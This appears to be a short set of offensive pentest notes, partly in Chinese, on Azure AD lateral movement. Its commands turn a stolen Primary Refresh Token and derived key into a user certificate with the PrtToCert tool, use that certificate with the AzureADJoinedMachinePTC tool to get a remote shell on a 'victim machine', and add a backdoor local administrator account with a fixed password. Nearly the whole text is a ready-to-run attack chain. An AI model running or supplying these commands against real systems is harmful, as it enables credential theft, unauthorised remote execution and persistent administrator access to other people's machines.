	Copy-Item -ToSession $jumpvm -Path C:\Tools\PrtToCertmaster.zip -Destination C:\Users\Username\Documents\username –Verbose
	Expand-Archive -Path C:\Users\Username\Documents\username\PrtToCert-master.zip -DestinationPath C:\Users\Username\Documents\username\PrtToCert

	需要 PRT、TenantID、Context 和 DerivedKey
	& 'C:\Program Files\Python39\python.exe' C:\Users\Username\Documents\username\PrtToCert\RequestCert.py --tenantId <TENANT-ID> --prt <PRT> --userName <Username>@<TENANT NAME>.onmicrosoft.com --hexCtx <HEX-CONTEXT> --hexDerivedKey <HEX-DERIVED-KEY>
	PFX 使用名称 <Username>@<TENANT NAME>.onmicrosoft.com.pfx 和密码 AzureADCert 保存
	Python tool that will authenticate to the remote machine, run PSEXEC and open a CMD on the victim machine

	https://github.com/morRubin/AzureADJoinedMachinePTC

	Main.py [-h] --usercert USERCERT --certpass CERTPASS --remoteip REMOTEIP
	Main.py --usercert "admin.pfx" --certpass password --remoteip 10.10.10.10

	python Main.py --usercert C:\Users\Username\Documents\username\<USERNAME>@<TENANT NAME>.onmicrosoft.com.pfx --
	certpass AzureADCert --remoteip 10.10.10.10 --command "cmd.exe /c net user username Password@123 /add /Y && net localgroup administrators username /add"
